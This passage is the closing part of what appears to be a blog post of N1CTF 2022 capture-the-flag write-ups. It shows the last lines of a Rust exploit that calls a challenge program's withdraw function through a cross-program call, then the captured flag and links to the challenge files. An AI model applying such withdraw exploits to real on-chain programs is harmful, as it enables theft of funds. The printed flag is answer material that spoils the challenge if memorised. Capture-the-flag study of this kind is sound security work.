+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">cpi_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">chall</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">withdraw</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">,</span><span class="w"> </span><span class="n">o2</span><span class="p">,</span><span class="w"> </span><span class="n">e2</span><span class="p">,</span><span class="w"> </span><span class="mi">500</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>And that&rsquo;s it, running <code>run.sh</code> to connect to the server and get the flag:</p>
+<pre tabindex="0"><code>n1ctf{I_sh0uld_h4ve_ch0s3n_4_b3tt3r_se3d_de5ign}
+</code></pre><h2 id="appendix">Appendix</h2>
+<ul>
+<li>The files for Utility Payment Service are <a href="/posts/20221128-n1ctf2022-writeups/Utility_Payment_Service.tar.gz" rel="">here</a></li>
+<li>The files for Simple Staking are <a href="/posts/20221128-n1ctf2022-writeups/Simple_Staking.tar.gz" rel="">here</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-11-28</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/20220704-ggctf2022-writeups/" class="prev" rel="prev" title="GoogleCTF2022 - eldar writeups"><i class="fas fa-angle-left fa-fw"></i>GoogleCTF2022 - eldar writeups</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":60},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-HGQHGNF9HJ');
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HGQHGNF9HJ" async></script></body>
+</html>
